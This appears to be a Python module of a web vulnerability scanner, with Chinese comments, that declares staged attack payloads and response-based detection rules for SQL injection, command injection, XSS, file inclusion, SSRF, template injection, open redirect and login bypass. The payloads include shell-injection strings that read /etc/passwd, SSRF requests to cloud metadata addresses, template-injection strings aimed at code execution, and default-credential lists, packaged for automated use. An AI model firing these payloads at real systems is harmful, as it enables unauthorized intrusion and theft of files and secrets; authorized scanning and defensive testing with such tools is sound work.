"""
统一漏洞检测框架 (v27)

声明式定义所有漏洞类型的载荷和检测逻辑。
替代硬编码在 _detect_vuln_indicators 和 payload_library 中的分散定义。

每种漏洞类型定义:
- base_value: MCTS 基础评分
- param_hints: 参数名提示
- endpoint_hints: 端点路径提示
- payloads: 分阶段载荷 (phase1_detection → phase2_exploit → phase3_deep)
- detectors: 声明式检测规则 (关键词/时间/结构/指纹)
"""

# ──── 通用检测辅助函数 ────

def _content_structure_changed(bl_body: str, r_body: str) -> bool:
    """HTML 结构变化检测 — 类型无关"""
    import re
    # 标签计数变化
    for tag in ('tr', 'li', 'td', 'th', 'div', 'span', 'p', 'h1', 'h2', 'h3'):
        bl_n = len(re.findall(f'<{tag}[^>]*>', bl_body, re.I))
        r_n = len(re.findall(f'<{tag}[^>]*>', r_body, re.I))
        if bl_n != r_n:
            return True
    # 空结果关键词
    no_result = ('no result', 'empty', 'not found', 'no data', 'no record',
                 '无结果', '无数据', '未找到')
    bl_has = any(kw in bl_body.lower() for kw in no_result)
    r_has = any(kw in r_body.lower() for kw in no_result)
    if bl_has != r_has:
        return True
    return False


def _content_fingerprint_changed(bl_body: str, r_body: str) -> bool:
    """内容指纹变化 — 去数字后对比"""
    import re
    bl_fp = re.sub(r'\d+', '', bl_body)
    r_fp = re.sub(r'\d+', '', r_body)
    return bl_fp != r_fp


def _has_sleep_payload(payload: str) -> bool:
    """检查 payload 是否包含时间延迟"""
    import re
    patterns = [
        r'sleep\s+\d+', r'ping\s+-[nc]\s+\d+', r'timeout\s+\d+',
        r'WAITFOR\s+DELAY', r'pg_sleep', r'BENCHMARK', r'DBMS_PIPE',
    ]
    return any(re.search(p, payload, re.IGNORECASE) for p in patterns)


# ──── 统一检测框架 ────

VULN_DETECTION: dict[str, dict] = {
    "sql_injection": {
        "base_value": 0.9,
        "param_hints": ["id", "q", "query", "search", "name", "username", "sort", "order", "uid"],
        "endpoint_hints": ["sqli", "sql", "query", "search", "id", "user", "login", "blind", "union", "select", "database"],
        "payloads": {
            "phase1_detection": ["'", '"', "1", "1'", "1)"],
            "phase2_boolean":   ["1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2"],
            "phase3_time":      ["1 AND SLEEP(3)-- -", "1' AND SLEEP(3)-- -", "1 AND pg_sleep(3)--", "1 WAITFOR DELAY '0:0:3'--"],
            "phase4_union":     ["-1 UNION SELECT 1,2,3--+", "1' UNION SELECT 1,2,3-- -"],
            "phase5_error":     ["1' AND updatexml(1,concat(0x7e,database()),1)-- -", "1 AND extractvalue(1,concat(0x7e,database()))-- -"],
        },
        "detectors": {
            "error_keywords": ["sql syntax", "mysql_fetch", "unclosed quotation", "you have an error in your sql",
                               "pg_query", "ora-", "sqlite3", "syntax error", "warning: mysql"],
            "output_keywords": [],
            "content_keywords": [],
            "time_threshold": 3000,
            "sleep_patterns": ["sleep", "pg_sleep", "waitfor", "benchmark", "dbms_pipe"],
            "structure_change": True,
            "content_fingerprint": True,
            "response_len_change": 20,
        },
    },

    "rce": {
        "base_value": 0.9,
        "param_hints": ["cmd", "exec", "command", "ping", "ip", "host", "addr", "ipaddress", "address", "target", "input", "arg"],
        "endpoint_hints": ["exec", "cmd", "ping", "shell", "run", "eval", "rce"],
        "payloads": {
            "phase1_separators":    [";id", "|id", "&& id"],
            "phase2_substitution":  ["$(id)", "`id`"],
            "phase3_time":          ["; sleep 5", "| sleep 5", "127.0.0.1; sleep 5", "127.0.0.1 | sleep 5"],
            "phase4_output":        ["; id 2>&1", "| base64 /etc/passwd"],
        },
        "detectors": {
            "error_keywords": [],
            "output_keywords": ["uid=", "gid=", "www-data", "root:x:0", "/bin/bash", "/bin/sh"],
            "content_keywords": [],
            "time_threshold": 3000,
            "sleep_patterns": ["sleep", "ping -c", "ping -n", "timeout"],
            "structure_change": True,
            "content_fingerprint": True,
            "response_len_change": 50,
        },
    },

    "xss": {
        "base_value": 0.5,
        "param_hints": ["q", "search", "name", "message", "comment", "input", "text", "keyword"],
        "endpoint_hints": ["xss", "search", "comment", "message", "post", "profile", "reflected", "dom", "stored"],
        "payloads": {
            "phase1_html":         ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "<svg/onload=alert(1)>"],
            "phase2_attr_escape":  ["'><img src=x onerror=alert(1)>", '"><svg/onload=alert(1)>', "'-alert(1)-'"],
            "phase3_js_escape":    ['";alert(1)//', "</script><img src=x onerror=alert(1)>"],
        },
        "detectors": {
            "error_keywords": [],
            "output_keywords": ["<script>alert(", "onerror=alert(", "<svg/onload=", "ontoggle=alert(", "<img src=x onerror="],
            "content_keywords": [],
            "time_threshold": 0,
            "sleep_patterns": [],
            "structure_change": False,
            "content_fingerprint": False,
            "response_len_change": 10,
        },
    },

    "lfi": {
        "base_value": 0.65,
        "param_hints": ["file", "path", "page", "include", "filename", "template", "doc"],
        "endpoint_hints": ["file", "include", "page", "template", "load", "doc", "lfi", "fi_"],
        "payloads": {
            "phase1_traversal":    ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
            "phase2_encoded":      ["..%2f..%2f..%2fetc%2fpasswd", "..%5c..%5c..%5cwindows%5cwin.ini"],
            "phase3_php_wrapper":  ["php://filter/convert.base64-encode/resource=index", "php://filter/read=convert.base64-encode/resource=../index"],
            "phase4_bypass":       ["....//....//....//etc/passwd"],
        },
        "detectors": {
            "error_keywords": [],
            "output_keywords": ["root:", "/bin/bash", "/bin/sh", "daemon:", "nobody:", "[boot loader]",
                                "[extensions]", "[fonts]", "[files]", "[Mail]"],
            "content_keywords": [],
            "time_threshold": 0,
            "sleep_patterns": [],
            "structure_change": True,
            "content_fingerprint": True,
            "response_len_change": 100,
        },
    },

    "path_traversal": {
        "base_value": 0.65,
        "param_hints": ["file", "path", "dir", "folder", "download"],
        "endpoint_hints": ["file", "download", "path", "dir", "folder"],
        "payloads": {
            "phase1_traversal":    ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
            "phase2_encoded":      ["..%2f..%2f..%2fetc%2fpasswd", "..%5c..%5c..%5cwindows%5cwin.ini"],
        },
        "detectors": {
            "error_keywords": [],
            "output_keywords": ["root:", "/bin/bash", "/bin/sh", "daemon:", "nobody:"],
            "content_keywords": [],
            "time_threshold": 0,
            "sleep_patterns": [],
            "structure_change": True,
            "content_fingerprint": True,
            "response_len_change": 100,
        },
    },

    "ssrf": {
        "base_value": 0.75,
        "param_hints": ["url", "link", "callback", "redirect", "fetch", "proxy", "dest"],
        "endpoint_hints": ["ssrf", "curl", "fetch", "proxy", "url", "link", "fgc"],
        "payloads": {
            "phase1_localhost":    ["http://127.0.0.1:80", "http://[::1]:80", "http://localhost"],
            "phase2_cloud_meta":  ["http://169.254.169.254/latest/meta-data/", "http://100.100.100.200/latest/meta-data/"],
            "phase3_protocol":    ["file:///etc/passwd", "gopher://127.0.0.1:80/_"],
        },
        "detectors": {
            "error_keywords": [],
            "output_keywords": [],
            "content_keywords": ["root:", "/etc/passwd", "metadata", "169.254", "localhost", "127.0.0.1", "internal"],
            "time_threshold": 5000,
            "sleep_patterns": [],
            "structure_change": True,
            "content_fingerprint": True,
            "response_len_change": 200,
        },
    },

    "ssti": {
        "base_value": 0.65,
        "param_hints": ["template", "name", "message", "content", "text"],
        "endpoint_hints": ["template", "ssti", "render", "view"],
        "payloads": {
            "phase1_expression":  ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
            "phase2_config":     ["{{config}}", "${settings}", "<%= process.env %>"],
            "phase3_rce":        ["{{''.__class__.__mro__[2].__subclasses__()}}"],
        },
        "detectors": {
            "error_keywords": [],
            "output_keywords": ["SECRET_KEY", "DEBUG"],
            "content_keywords": [],
            "time_threshold": 0,
            "sleep_patterns": [],
            "structure_change": True,
            "content_fingerprint": True,
            "response_len_change": 30,
        },
    },

    "file_upload": {
        "base_value": 0.7,
        "param_hints": ["file", "image", "upload", "avatar", "attachment"],
        "endpoint_hints": ["upload", "file", "image", "avatar", "attachment", "unsafeupload"],
        "payloads": {},
        "detectors": {
            "error_keywords": [],
            "output_keywords": [],
            "content_keywords": ["/uploads/", "/upload/", "/files/", "../upload", "success"],
            "time_threshold": 0,
            "sleep_patterns": [],
            "structure_change": True,
            "content_fingerprint": False,
            "response_len_change": 50,
        },
    },

    "idor": {
        "base_value": 0.6,
        "param_hints": ["id", "uid", "user_id", "account", "order_id", "profile_id"],
        "endpoint_hints": ["user", "account", "order", "profile", "api", "idor", "overpermission"],
        "payloads": {
            "phase1_enum":        ["1", "2", "0", "admin", "999999"],
        },
        "detectors": {
            "error_keywords": [],
            "output_keywords": [],
            "content_keywords": [],
            "time_threshold": 0,
            "sleep_patterns": [],
            "structure_change": True,
            "content_fingerprint": True,
            "response_len_change": 50,
        },
    },

    "open_redirect": {
        "base_value": 0.35,
        "param_hints": ["url", "redirect", "next", "return", "goto", "callback"],
        "endpoint_hints": ["redirect", "url", "goto", "next", "return", "unsafere"],
        "payloads": {
            "phase1_external":    ["https://evil.com", "//evil.com", "javascript:alert(1)"],
        },
        "detectors": {
            "error_keywords": [],
            "output_keywords": ["evil.com"],
            "content_keywords": [],
            "time_threshold": 0,
            "sleep_patterns": [],
            "structure_change": False,
            "content_fingerprint": False,
            "response_len_change": 0,
        },
    },

    "auth_bypass": {
        "base_value": 0.7,
        "param_hints": ["username", "password", "user", "pass", "token"],
        "endpoint_hints": ["admin", "login", "auth", "manage", "dashboard", "burteforce", "bf_"],
        "payloads": {
            "phase1_sqli_login":  ["admin' --", "' OR '1'='1", "admin' OR '1'='1"],
            "phase2_default":     ["admin:admin", "admin:password", "admin:123456"],
        },
        "detectors": {
            "error_keywords": [],
            "output_keywords": ["dashboard", "admin", "管理", "后台", "欢迎"],
            "content_keywords": [],
            "time_threshold": 0,
            "sleep_patterns": [],
            "structure_change": True,
            "content_fingerprint": True,
            "response_len_change": 200,
        },
    },
}


def get_staged_payloads(vuln_type: str) -> list[str]:
    """获取某漏洞类型的所有分阶段载荷 (扁平化)"""
    framework = VULN_DETECTION.get(vuln_type, {})
    staged = framework.get("payloads", {})
    all_payloads = []
    for phase_name, payloads in staged.items():
        all_payloads.extend(payloads)
    return all_payloads


def get_payloads_by_phase(vuln_type: str) -> dict[str, list[str]]:
    """获取某漏洞类型的分阶段载荷 (保持阶段结构)"""
    framework = VULN_DETECTION.get(vuln_type, {})
    return framework.get("payloads", {})


def detect_signal(
    payload: str, body: str, time_ms: int, status: int, headers: dict,
    baseline_body: str, baseline_len: int, baseline_status: int, baseline_time_ms: int,
    vuln_type: str,
) -> dict:
    """
    统一漏洞信号检测入口。

    Returns:
        {"level": "confirmed"|"weak"|"none", "method": str, "evidence": str}
    """
    framework = VULN_DETECTION.get(vuln_type)
    if not framework:
        return {"level": "none", "method": "", "evidence": ""}

    detectors = framework["detectors"]
    body_lower = body.lower()

    # 1. 错误关键词
    for kw in detectors.get("error_keywords", []):
        if kw in body_lower:
            return {"level": "confirmed", "method": "error", "evidence": f"error: {kw}"}

    # 2. 回显关键词 (RCE/LFI/XSS)
    for kw in detectors.get("output_keywords", []):
        if kw in body:
            return {"level": "confirmed", "method": "output", "evidence": f"output: {kw}"}

    # 3. 内容关键词 (SSRF/file_upload)
    for kw in detectors.get("content_keywords", []):
        if kw in body_lower:
            return {"level": "confirmed", "method": "content", "evidence": f"content: {kw}"}

    # 4. 时间盲注 (SQLi/RCE)
    threshold = detectors.get("time_threshold", 0)
    if threshold > 0 and time_ms > threshold:
        for sp in detectors.get("sleep_patterns", []):
            if sp in payload.lower():
                return {"level": "confirmed", "method": "time_blind",
                        "evidence": f"延迟 {time_ms}ms"}

    # 5. 响应长度变化
    len_threshold = detectors.get("response_len_change", 20)
    if abs(len(body) - baseline_len) > len_threshold:
        return {"level": "weak", "method": "len_diff",
                "evidence": f"长度差异 {len(body) - baseline_len}"}

    # 6. 结构变化
    if detectors.get("structure_change") and baseline_body:
        if _content_structure_changed(baseline_body, body):
            return {"level": "weak", "method": "structure_diff",
                    "evidence": "HTML 结构变化"}

    # 7. 内容指纹变化
    if detectors.get("content_fingerprint") and baseline_body:
        if _content_fingerprint_changed(baseline_body, body):
            return {"level": "weak", "method": "fingerprint_diff",
                    "evidence": "内容指纹变化"}

    return {"level": "none", "method": "", "evidence": ""}
